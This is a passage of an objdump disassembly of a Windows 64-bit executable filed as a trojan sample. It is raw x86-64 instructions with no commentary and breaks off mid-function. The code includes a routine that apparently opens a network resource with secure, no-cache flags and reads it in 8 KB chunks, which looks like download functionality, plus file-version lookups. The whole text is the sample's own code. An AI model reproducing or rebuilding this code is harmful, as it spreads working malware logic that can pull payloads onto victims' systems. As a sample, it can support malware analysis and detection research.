
malware_samples/trojan/4df6f3e4d32b107f7717a95424697ac56a8ead6df704c51014a79527f8e3977e.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 83 ec 48          	sub    $0x48,%rsp
   180001004:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001007:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   18000100c:	66 0f 6f 0d 5c 7e 00 	movdqa 0x7e5c(%rip),%xmm1        # 0x180008e70
   180001013:	00 
   180001014:	f3 0f 7f 4c 24 30    	movdqu %xmm1,0x30(%rsp)
   18000101a:	f2 0f 10 05 5e 79 00 	movsd  0x795e(%rip),%xmm0        # 0x180008980
   180001021:	00 
   180001022:	f2 0f 11 44 24 20    	movsd  %xmm0,0x20(%rsp)
   180001028:	0f b7 05 59 79 00 00 	movzwl 0x7959(%rip),%eax        # 0x180008988
   18000102f:	66 89 44 24 28       	mov    %ax,0x28(%rsp)
   180001034:	0f b6 05 4f 79 00 00 	movzbl 0x794f(%rip),%eax        # 0x18000898a
   18000103b:	88 44 24 2a          	mov    %al,0x2a(%rsp)
   18000103f:	c6 44 24 2b 00       	movb   $0x0,0x2b(%rsp)
   180001044:	b9 20 00 00 00       	mov    $0x20,%ecx
   180001049:	e8 62 34 00 00       	call   0x1800044b0
   18000104e:	48 89 05 03 a7 00 00 	mov    %rax,0xa703(%rip)        # 0x18000b758
   180001055:	48 89 05 04 a7 00 00 	mov    %rax,0xa704(%rip)        # 0x18000b760
   18000105c:	48 8d 48 20          	lea    0x20(%rax),%rcx
   180001060:	48 89 0d 01 a7 00 00 	mov    %rcx,0xa701(%rip)        # 0x18000b768
   180001067:	4c 8d 0d ea a6 00 00 	lea    0xa6ea(%rip),%r9        # 0x18000b758
   18000106e:	4c 89 4c 24 50       	mov    %r9,0x50(%rsp)
   180001073:	4c 8b c0             	mov    %rax,%r8
   180001076:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000107b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001080:	e8 4b 1f 00 00       	call   0x180002fd0
   180001085:	48 89 05 d4 a6 00 00 	mov    %rax,0xa6d4(%rip)        # 0x18000b760
   18000108c:	4c 8d 0d 9d 12 00 00 	lea    0x129d(%rip),%r9        # 0x180002330
   180001093:	ba 20 00 00 00       	mov    $0x20,%edx
   180001098:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000109e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800010a3:	e8 44 34 00 00       	call   0x1800044ec
   1800010a8:	48 8d 0d 51 48 00 00 	lea    0x4851(%rip),%rcx        # 0x180005900
   1800010af:	48 83 c4 48          	add    $0x48,%rsp
   1800010b3:	e9 54 38 00 00       	jmp    0x18000490c
   1800010b8:	cc                   	int3
   1800010b9:	cc                   	int3
   1800010ba:	cc                   	int3
   1800010bb:	cc                   	int3
   1800010bc:	cc                   	int3
   1800010bd:	cc                   	int3
   1800010be:	cc                   	int3
   1800010bf:	cc                   	int3
   1800010c0:	48 83 ec 68          	sub    $0x68,%rsp
   1800010c4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800010c7:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   1800010cc:	0f 57 c9             	xorps  %xmm1,%xmm1
   1800010cf:	66 0f 7f 4c 24 30    	movdqa %xmm1,0x30(%rsp)
   1800010d5:	41 b8 0e 00 00 00    	mov    $0xe,%r8d
   1800010db:	48 8d 15 ae 78 00 00 	lea    0x78ae(%rip),%rdx        # 0x180008990
   1800010e2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800010e7:	e8 94 17 00 00       	call   0x180002880
   1800010ec:	90                   	nop
   1800010ed:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800010f0:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   1800010f5:	0f 57 c9             	xorps  %xmm1,%xmm1
   1800010f8:	66 0f 7f 4c 24 50    	movdqa %xmm1,0x50(%rsp)
   1800010fe:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   180001104:	48 8d 15 a5 78 00 00 	lea    0x78a5(%rip),%rdx        # 0x1800089b0
   18000110b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180001110:	e8 6b 17 00 00       	call   0x180002880
   180001115:	90                   	nop
   180001116:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001119:	f3 0f 7f 05 1f a6 00 	movdqu %xmm0,0xa61f(%rip)        # 0x18000b740
   180001120:	00 
   180001121:	48 c7 05 24 a6 00 00 	movq   $0x0,0xa624(%rip)        # 0x18000b750
   180001128:	00 00 00 00 
   18000112c:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001131:	e8 7a 33 00 00       	call   0x1800044b0
   180001136:	48 89 05 03 a6 00 00 	mov    %rax,0xa603(%rip)        # 0x18000b740
   18000113d:	48 89 05 04 a6 00 00 	mov    %rax,0xa604(%rip)        # 0x18000b748
   180001144:	48 8d 48 40          	lea    0x40(%rax),%rcx
   180001148:	48 89 0d 01 a6 00 00 	mov    %rcx,0xa601(%rip)        # 0x18000b750
   18000114f:	4c 8d 0d ea a5 00 00 	lea    0xa5ea(%rip),%r9        # 0x18000b740
   180001156:	4c 89 4c 24 70       	mov    %r9,0x70(%rsp)
   18000115b:	4c 8b c0             	mov    %rax,%r8
   18000115e:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180001163:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001168:	e8 b3 1c 00 00       	call   0x180002e20
   18000116d:	48 89 05 d4 a5 00 00 	mov    %rax,0xa5d4(%rip)        # 0x18000b748
   180001174:	4c 8d 0d 35 11 00 00 	lea    0x1135(%rip),%r9        # 0x1800022b0
   18000117b:	ba 20 00 00 00       	mov    $0x20,%edx
   180001180:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180001186:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000118b:	e8 5c 33 00 00       	call   0x1800044ec
   180001190:	48 8d 0d 79 47 00 00 	lea    0x4779(%rip),%rcx        # 0x180005910
   180001197:	48 83 c4 68          	add    $0x68,%rsp
   18000119b:	e9 6c 37 00 00       	jmp    0x18000490c
   1800011a0:	48 8d 0d 79 47 00 00 	lea    0x4779(%rip),%rcx        # 0x180005920
   1800011a7:	e9 60 37 00 00       	jmp    0x18000490c
   1800011ac:	cc                   	int3
   1800011ad:	cc                   	int3
   1800011ae:	cc                   	int3
   1800011af:	cc                   	int3
   1800011b0:	48 8d 05 81 a5 00 00 	lea    0xa581(%rip),%rax        # 0x18000b738
   1800011b7:	c3                   	ret
   1800011b8:	cc                   	int3
   1800011b9:	cc                   	int3
   1800011ba:	cc                   	int3
   1800011bb:	cc                   	int3
   1800011bc:	cc                   	int3
   1800011bd:	cc                   	int3
   1800011be:	cc                   	int3
   1800011bf:	cc                   	int3
   1800011c0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800011c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800011ca:	53                   	push   %rbx
   1800011cb:	55                   	push   %rbp
   1800011cc:	56                   	push   %rsi
   1800011cd:	57                   	push   %rdi
   1800011ce:	48 83 ec 38          	sub    $0x38,%rsp
   1800011d2:	49 8b f0             	mov    %r8,%rsi
   1800011d5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1800011da:	48 8b fa             	mov    %rdx,%rdi
   1800011dd:	48 8b d9             	mov    %rcx,%rbx
   1800011e0:	e8 cb ff ff ff       	call   0x1800011b0
   1800011e5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1800011ea:	4c 8b ce             	mov    %rsi,%r9
   1800011ed:	4c 8b c7             	mov    %rdi,%r8
   1800011f0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1800011f7:	00 00 
   1800011f9:	48 8b d3             	mov    %rbx,%rdx
   1800011fc:	48 8b 08             	mov    (%rax),%rcx
   1800011ff:	ff 15 7b 50 00 00    	call   *0x507b(%rip)        # 0x180006280
   180001205:	85 c0                	test   %eax,%eax
   180001207:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   18000120c:	0f 48 c1             	cmovs  %ecx,%eax
   18000120f:	48 83 c4 38          	add    $0x38,%rsp
   180001213:	5f                   	pop    %rdi
   180001214:	5e                   	pop    %rsi
   180001215:	5d                   	pop    %rbp
   180001216:	5b                   	pop    %rbx
   180001217:	c3                   	ret
   180001218:	cc                   	int3
   180001219:	cc                   	int3
   18000121a:	cc                   	int3
   18000121b:	cc                   	int3
   18000121c:	cc                   	int3
   18000121d:	cc                   	int3
   18000121e:	cc                   	int3
   18000121f:	cc                   	int3
   180001220:	40 53                	rex push %rbx
   180001222:	48 83 ec 20          	sub    $0x20,%rsp
   180001226:	48 8b d9             	mov    %rcx,%rbx
   180001229:	48 8b c2             	mov    %rdx,%rax
   18000122c:	48 8d 0d 7d 76 00 00 	lea    0x767d(%rip),%rcx        # 0x1800088b0
   180001233:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001236:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000123a:	48 89 0b             	mov    %rcx,(%rbx)
   18000123d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001241:	0f 11 02             	movups %xmm0,(%rdx)
   180001244:	ff 15 16 4f 00 00    	call   *0x4f16(%rip)        # 0x180006160
   18000124a:	48 8b c3             	mov    %rbx,%rax
   18000124d:	48 83 c4 20          	add    $0x20,%rsp
   180001251:	5b                   	pop    %rbx
   180001252:	c3                   	ret
   180001253:	cc                   	int3
   180001254:	cc                   	int3
   180001255:	cc                   	int3
   180001256:	cc                   	int3
   180001257:	cc                   	int3
   180001258:	cc                   	int3
   180001259:	cc                   	int3
   18000125a:	cc                   	int3
   18000125b:	cc                   	int3
   18000125c:	cc                   	int3
   18000125d:	cc                   	int3
   18000125e:	cc                   	int3
   18000125f:	cc                   	int3
   180001260:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180001264:	48 8d 05 95 76 00 00 	lea    0x7695(%rip),%rax        # 0x180008900
   18000126b:	48 85 d2             	test   %rdx,%rdx
   18000126e:	48 0f 45 c2          	cmovne %rdx,%rax
   180001272:	c3                   	ret
   180001273:	cc                   	int3
   180001274:	cc                   	int3
   180001275:	cc                   	int3
   180001276:	cc                   	int3
   180001277:	cc                   	int3
   180001278:	cc                   	int3
   180001279:	cc                   	int3
   18000127a:	cc                   	int3
   18000127b:	cc                   	int3
   18000127c:	cc                   	int3
   18000127d:	cc                   	int3
   18000127e:	cc                   	int3
   18000127f:	cc                   	int3
   180001280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001285:	57                   	push   %rdi
   180001286:	48 83 ec 20          	sub    $0x20,%rsp
   18000128a:	48 8d 05 1f 76 00 00 	lea    0x761f(%rip),%rax        # 0x1800088b0
   180001291:	48 8b f9             	mov    %rcx,%rdi
   180001294:	48 89 01             	mov    %rax,(%rcx)
   180001297:	8b da                	mov    %edx,%ebx
   180001299:	48 83 c1 08          	add    $0x8,%rcx
   18000129d:	ff 15 c5 4e 00 00    	call   *0x4ec5(%rip)        # 0x180006168
   1800012a3:	f6 c3 01             	test   $0x1,%bl
   1800012a6:	74 0d                	je     0x1800012b5
   1800012a8:	ba 18 00 00 00       	mov    $0x18,%edx
   1800012ad:	48 8b cf             	mov    %rdi,%rcx
   1800012b0:	e8 6f 36 00 00       	call   0x180004924
   1800012b5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800012ba:	48 8b c7             	mov    %rdi,%rax
   1800012bd:	48 83 c4 20          	add    $0x20,%rsp
   1800012c1:	5f                   	pop    %rdi
   1800012c2:	c3                   	ret
   1800012c3:	cc                   	int3
   1800012c4:	cc                   	int3
   1800012c5:	cc                   	int3
   1800012c6:	cc                   	int3
   1800012c7:	cc                   	int3
   1800012c8:	cc                   	int3
   1800012c9:	cc                   	int3
   1800012ca:	cc                   	int3
   1800012cb:	cc                   	int3
   1800012cc:	cc                   	int3
   1800012cd:	cc                   	int3
   1800012ce:	cc                   	int3
   1800012cf:	cc                   	int3
   1800012d0:	48 8d 05 d9 75 00 00 	lea    0x75d9(%rip),%rax        # 0x1800088b0
   1800012d7:	48 89 01             	mov    %rax,(%rcx)
   1800012da:	48 83 c1 08          	add    $0x8,%rcx
   1800012de:	48 ff 25 83 4e 00 00 	rex.W jmp *0x4e83(%rip)        # 0x180006168
   1800012e5:	cc                   	int3
   1800012e6:	cc                   	int3
   1800012e7:	cc                   	int3
   1800012e8:	cc                   	int3
   1800012e9:	cc                   	int3
   1800012ea:	cc                   	int3
   1800012eb:	cc                   	int3
   1800012ec:	cc                   	int3
   1800012ed:	cc                   	int3
   1800012ee:	cc                   	int3
   1800012ef:	cc                   	int3
   1800012f0:	48 8d 05 21 76 00 00 	lea    0x7621(%rip),%rax        # 0x180008918
   1800012f7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1800012fe:	00 
   1800012ff:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001303:	48 8d 05 e6 75 00 00 	lea    0x75e6(%rip),%rax        # 0x1800088f0
   18000130a:	48 89 01             	mov    %rax,(%rcx)
   18000130d:	48 8b c1             	mov    %rcx,%rax
   180001310:	c3                   	ret
   180001311:	cc                   	int3
   180001312:	cc                   	int3
   180001313:	cc                   	int3
   180001314:	cc                   	int3
   180001315:	cc                   	int3
   180001316:	cc                   	int3
   180001317:	cc                   	int3
   180001318:	cc                   	int3
   180001319:	cc                   	int3
   18000131a:	cc                   	int3
   18000131b:	cc                   	int3
   18000131c:	cc                   	int3
   18000131d:	cc                   	int3
   18000131e:	cc                   	int3
   18000131f:	cc                   	int3
   180001320:	48 83 ec 48          	sub    $0x48,%rsp
   180001324:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001329:	e8 c2 ff ff ff       	call   0x1800012f0
   18000132e:	48 8d 15 5b 8b 00 00 	lea    0x8b5b(%rip),%rdx        # 0x180009e90
   180001335:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000133a:	e8 5b 41 00 00       	call   0x18000549a
   18000133f:	cc                   	int3
   180001340:	40 53                	rex push %rbx
   180001342:	48 83 ec 20          	sub    $0x20,%rsp
   180001346:	48 8b d9             	mov    %rcx,%rbx
   180001349:	48 8b c2             	mov    %rdx,%rax
   18000134c:	48 8d 0d 5d 75 00 00 	lea    0x755d(%rip),%rcx        # 0x1800088b0
   180001353:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001356:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000135a:	48 89 0b             	mov    %rcx,(%rbx)
   18000135d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001361:	0f 11 02             	movups %xmm0,(%rdx)
   180001364:	ff 15 f6 4d 00 00    	call   *0x4df6(%rip)        # 0x180006160
   18000136a:	48 8d 05 7f 75 00 00 	lea    0x757f(%rip),%rax        # 0x1800088f0
   180001371:	48 89 03             	mov    %rax,(%rbx)
   180001374:	48 8b c3             	mov    %rbx,%rax
   180001377:	48 83 c4 20          	add    $0x20,%rsp
   18000137b:	5b                   	pop    %rbx
   18000137c:	c3                   	ret
   18000137d:	cc                   	int3
   18000137e:	cc                   	int3
   18000137f:	cc                   	int3
   180001380:	40 53                	rex push %rbx
   180001382:	48 83 ec 20          	sub    $0x20,%rsp
   180001386:	48 8b d9             	mov    %rcx,%rbx
   180001389:	48 8b c2             	mov    %rdx,%rax
   18000138c:	48 8d 0d 1d 75 00 00 	lea    0x751d(%rip),%rcx        # 0x1800088b0
   180001393:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001396:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000139a:	48 89 0b             	mov    %rcx,(%rbx)
   18000139d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800013a1:	0f 11 02             	movups %xmm0,(%rdx)
   1800013a4:	ff 15 b6 4d 00 00    	call   *0x4db6(%rip)        # 0x180006160
   1800013aa:	48 8d 05 17 75 00 00 	lea    0x7517(%rip),%rax        # 0x1800088c8
   1800013b1:	48 89 03             	mov    %rax,(%rbx)
   1800013b4:	48 8b c3             	mov    %rbx,%rax
   1800013b7:	48 83 c4 20          	add    $0x20,%rsp
   1800013bb:	5b                   	pop    %rbx
   1800013bc:	c3                   	ret
   1800013bd:	cc                   	int3
   1800013be:	cc                   	int3
   1800013bf:	cc                   	int3
   1800013c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800013c4:	48 8d 0d 65 75 00 00 	lea    0x7565(%rip),%rcx        # 0x180008930
   1800013cb:	ff 15 4f 4d 00 00    	call   *0x4d4f(%rip)        # 0x180006120
   1800013d1:	cc                   	int3
   1800013d2:	cc                   	int3
   1800013d3:	cc                   	int3
   1800013d4:	cc                   	int3
   1800013d5:	cc                   	int3
   1800013d6:	cc                   	int3
   1800013d7:	cc                   	int3
   1800013d8:	cc                   	int3
   1800013d9:	cc                   	int3
   1800013da:	cc                   	int3
   1800013db:	cc                   	int3
   1800013dc:	cc                   	int3
   1800013dd:	cc                   	int3
   1800013de:	cc                   	int3
   1800013df:	cc                   	int3
   1800013e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800013e5:	55                   	push   %rbp
   1800013e6:	56                   	push   %rsi
   1800013e7:	57                   	push   %rdi
   1800013e8:	41 56                	push   %r14
   1800013ea:	41 57                	push   %r15
   1800013ec:	b8 60 20 00 00       	mov    $0x2060,%eax
   1800013f1:	e8 aa 41 00 00       	call   0x1800055a0
   1800013f6:	48 2b e0             	sub    %rax,%rsp
   1800013f9:	48 8b 05 40 9c 00 00 	mov    0x9c40(%rip),%rax        # 0x18000b040
   180001400:	48 33 c4             	xor    %rsp,%rax
   180001403:	48 89 84 24 50 20 00 	mov    %rax,0x2050(%rsp)
   18000140a:	00 
   18000140b:	48 8b f2             	mov    %rdx,%rsi
   18000140e:	48 8b f9             	mov    %rcx,%rdi
   180001411:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   180001416:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   18000141d:	00 
   18000141e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001421:	0f 11 01             	movups %xmm0,(%rcx)
   180001424:	45 33 ff             	xor    %r15d,%r15d
   180001427:	4c 89 39             	mov    %r15,(%rcx)
   18000142a:	4c 89 79 08          	mov    %r15,0x8(%rcx)
   18000142e:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   180001432:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   180001439:	00 
   18000143a:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   18000143f:	45 33 c9             	xor    %r9d,%r9d
   180001442:	45 33 c0             	xor    %r8d,%r8d
   180001445:	ba 01 00 00 00       	mov    $0x1,%edx
   18000144a:	48 8d 0d ef 74 00 00 	lea    0x74ef(%rip),%rcx        # 0x180008940
   180001451:	ff 15 71 4d 00 00    	call   *0x4d71(%rip)        # 0x1800061c8
   180001457:	4c 8b f0             	mov    %rax,%r14
   18000145a:	48 85 c0             	test   %rax,%rax
   18000145d:	0f 84 ef 00 00 00    	je     0x180001552
   180001463:	48 8b ee             	mov    %rsi,%rbp
   180001466:	48 83 7e 18 0f       	cmpq   $0xf,0x18(%rsi)
   18000146b:	76 03                	jbe    0x180001470
   18000146d:	48 8b 2e             	mov    (%rsi),%rbp
   180001470:	48 8b 46 10          	mov    0x10(%rsi),%rax
   180001474:	48 83 f8 08          	cmp    $0x8,%rax
   180001478:	72 26                	jb     0x1800014a0
   18000147a:	48 8d 1c 28          	lea    (%rax,%rbp,1),%rbx
   18000147e:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   180001484:	4c 8d 05 e5 74 00 00 	lea    0x74e5(%rip),%r8        # 0x180008970
   18000148b:	48 8b d3             	mov    %rbx,%rdx
   18000148e:	48 8b cd             	mov    %rbp,%rcx
   180001491:	e8 da 2f 00 00       	call   0x180004470
   180001496:	48 3b c3             	cmp    %rbx,%rax
   180001499:	74 05                	je     0x1800014a0
   18000149b:	48 2b c5             	sub    %rbp,%rax
   18000149e:	eb 07                	jmp    0x1800014a7
   1800014a0:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1800014a7:	b9 00 00 80 84       	mov    $0x84800000,%ecx
   1800014ac:	ba 00 00 00 84       	mov    $0x84000000,%edx
   1800014b1:	48 85 c0             	test   %rax,%rax
   1800014b4:	0f 45 ca             	cmovne %edx,%ecx
   1800014b7:	48 83 7e 18 0f       	cmpq   $0xf,0x18(%rsi)
   1800014bc:	76 03                	jbe    0x1800014c1
   1800014be:	48 8b 36             	mov    (%rsi),%rsi
   1800014c1:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   1800014c6:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   1800014ca:	45 33 c9             	xor    %r9d,%r9d
   1800014cd:	45 33 c0             	xor    %r8d,%r8d
   1800014d0:	48 8b d6             	mov    %rsi,%rdx
   1800014d3:	49 8b ce             	mov    %r14,%rcx
   1800014d6:	ff 15 f4 4c 00 00    	call   *0x4cf4(%rip)        # 0x1800061d0
   1800014dc:	48 8b d8             	mov    %rax,%rbx
   1800014df:	48 85 c0             	test   %rax,%rax
   1800014e2:	74 64                	je     0x180001548
   1800014e4:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   1800014e9:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800014ee:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   1800014f4:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800014f9:	48 8b c8             	mov    %rax,%rcx
   1800014fc:	ff 15 d6 4c 00 00    	call   *0x4cd6(%rip)        # 0x1800061d8
   180001502:	85 c0                	test   %eax,%eax
   180001504:	74 39                	je     0x18000153f
   180001506:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000150a:	85 c0                	test   %eax,%eax
   18000150c:	74 31                	je     0x18000153f
   18000150e:	44 8b c8             	mov    %eax,%r9d
   180001511:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   180001515:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   18000151a:	48 8b cf             	mov    %rdi,%rcx
   18000151d:	e8 8e 0e 00 00       	call   0x1800023b0
   180001522:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180001527:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   18000152d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180001532:	48 8b cb             	mov    %rbx,%rcx
   180001535:	ff 15 9d 4c 00 00    	call   *0x4c9d(%rip)        # 0x1800061d8
   18000153b:	85 c0                	test   %eax,%eax
   18000153d:	75 c7                	jne    0x180001506
   18000153f:	48 8b cb             	mov    %rbx,%rcx
   180001542:	ff 15 78 4c 00 00    	call   *0x4c78(%rip)        # 0x1800061c0
   180001548:	49 8b ce             	mov    %r14,%rcx
   18000154b:	ff 15 6f 4c 00 00    	call   *0x4c6f(%rip)        # 0x1800061c0
   180001551:	90                   	nop
   180001552:	48 8b c7             	mov    %rdi,%rax
   180001555:	48 8b 8c 24 50 20 00 	mov    0x2050(%rsp),%rcx
   18000155c:	00 
   18000155d:	48 33 cc             	xor    %rsp,%rcx
   180001560:	e8 2b 2f 00 00       	call   0x180004490
   180001565:	48 8b 9c 24 a0 20 00 	mov    0x20a0(%rsp),%rbx
   18000156c:	00 
   18000156d:	48 81 c4 60 20 00 00 	add    $0x2060,%rsp
   180001574:	41 5f                	pop    %r15
   180001576:	41 5e                	pop    %r14
   180001578:	5f                   	pop    %rdi
   180001579:	5e                   	pop    %rsi
   18000157a:	5d                   	pop    %rbp
   18000157b:	c3                   	ret
   18000157c:	cc                   	int3
   18000157d:	cc                   	int3
   18000157e:	cc                   	int3
   18000157f:	cc                   	int3
   180001580:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001585:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000158a:	56                   	push   %rsi
   18000158b:	57                   	push   %rdi
   18000158c:	41 54                	push   %r12
   18000158e:	41 56                	push   %r14
   180001590:	41 57                	push   %r15
   180001592:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   180001599:	48 8b 05 a0 9a 00 00 	mov    0x9aa0(%rip),%rax        # 0x18000b040
   1800015a0:	48 33 c4             	xor    %rsp,%rax
   1800015a3:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   1800015aa:	00 
   1800015ab:	4c 8b f2             	mov    %rdx,%r14
   1800015ae:	48 8b f1             	mov    %rcx,%rsi
   1800015b1:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   1800015b6:	45 33 e4             	xor    %r12d,%r12d
   1800015b9:	48 8b ca             	mov    %rdx,%rcx
   1800015bc:	48 83 7a 18 07       	cmpq   $0x7,0x18(%rdx)
   1800015c1:	76 03                	jbe    0x1800015c6
   1800015c3:	48 8b 0a             	mov    (%rdx),%rcx
   1800015c6:	48 8d 54 24 64       	lea    0x64(%rsp),%rdx
   1800015cb:	ff 15 df 4b 00 00    	call   *0x4bdf(%rip)        # 0x1800061b0
   1800015d1:	44 8b f8             	mov    %eax,%r15d
   1800015d4:	85 c0                	test   %eax,%eax
   1800015d6:	75 25                	jne    0x1800015fd
   1800015d8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800015db:	0f 11 06             	movups %xmm0,(%rsi)
   1800015de:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   1800015e2:	4c 89 66 18          	mov    %r12,0x18(%rsi)
   1800015e6:	45 33 c0             	xor    %r8d,%r8d
   1800015e9:	48 8d 15 e0 73 00 00 	lea    0x73e0(%rip),%rdx        # 0x1800089d0
   1800015f0:	48 8b ce             	mov    %rsi,%rcx
   1800015f3:	e8 88 12 00 00       	call   0x180002880
   1800015f8:	e9 88 01 00 00       	jmp    0x180001785
   1800015fd:	0f 57 c9             	xorps  %xmm1,%xmm1
   180001600:	f3 0f 7f 4c 24 30    	movdqu %xmm1,0x30(%rsp)
   180001606:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   18000160b:	41 81 ff 00 10 00 00 	cmp    $0x1000,%r15d
   180001612:	72 29                	jb     0x18000163d
   180001614:	49 8d 4f 27          	lea    0x27(%r15),%rcx
   180001618:	49 3b cf             	cmp    %r15,%rcx
   18000161b:	0f 86 01 02 00 00    	jbe    0x180001822
   180001621:	e8 8a 2e 00 00       	call   0x1800044b0
   180001626:	48 85 c0             	test   %rax,%rax
   180001629:	0f 84 dd 01 00 00    	je     0x18000180c
   18000162f:	48 8d 58 27          	lea    0x27(%rax),%rbx
   180001633:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   180001637:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   18000163b:	eb 0b                	jmp    0x180001648
   18000163d:	49 8b cf             	mov    %r15,%rcx
   180001640:	e8 6b 2e 00 00       	call   0x1800044b0
   180001645:	48 8b d8             	mov    %rax,%rbx
   180001648:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   18000164d:	4a 8d 3c 3b          	lea    (%rbx,%r15,1),%rdi
   180001651:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   180001656:	4d 8b c7             	mov    %r15,%r8
   180001659:	33 d2                	xor    %edx,%edx
   18000165b:	48 8b cb             	mov    %rbx,%rcx
   18000165e:	e8 1f 3e 00 00       	call   0x180005482
   180001663:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180001668:	49 83 7e 18 07       	cmpq   $0x7,0x18(%r14)
   18000166d:	76 03                	jbe    0x180001672
   18000166f:	4d 8b 36             	mov    (%r14),%r14
   180001672:	4c 8b cb             	mov    %rbx,%r9
   180001675:	45 8b c7             	mov    %r15d,%r8d
   180001678:	8b 54 24 64          	mov    0x64(%rsp),%edx
   18000167c:	49 8b ce             	mov    %r14,%rcx
   18000167f:	ff 15 1b 4b 00 00    	call   *0x4b1b(%rip)        # 0x1800061a0
   180001685:	85 c0                	test   %eax,%eax
   180001687:	0f 84 9f 00 00 00    	je     0x18000172c
   18000168d:	44 89 64 24 60       	mov    %r12d,0x60(%rsp)
   180001692:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   180001697:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   18000169c:	48 8d 15 35 73 00 00 	lea    0x7335(%rip),%rdx        # 0x1800089d8
   1800016a3:	48 8b cb             	mov    %rbx,%rcx
   1800016a6:	ff 15 fc 4a 00 00    	call   *0x4afc(%rip)        # 0x1800061a8
   1800016ac:	85 c0                	test   %eax,%eax
   1800016ae:	74 7c                	je     0x18000172c
   1800016b0:	41 8b ec             	mov    %r12d,%ebp
   1800016b3:	f7 44 24 60 fc ff ff 	testl  $0xfffffffc,0x60(%rsp)
   1800016ba:	ff 
   1800016bb:	76 6f                	jbe    0x18000172c
   1800016bd:	0f 1f 00             	nopl   (%rax)
   1800016c0:	8b cd                	mov    %ebp,%ecx
   1800016c2:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1800016c7:	0f b7 54 88 02       	movzwl 0x2(%rax,%rcx,4),%edx
   1800016cc:	44 0f b7 0c 88       	movzwl (%rax,%rcx,4),%r9d
   1800016d1:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1800016d5:	4c 8d 05 34 73 00 00 	lea    0x7334(%rip),%r8        # 0x180008a10
   1800016dc:	ba 32 00 00 00       	mov    $0x32,%edx
   1800016e1:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800016e6:	e8 d5 fa ff ff       	call   0x1800011c0
   1800016eb:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
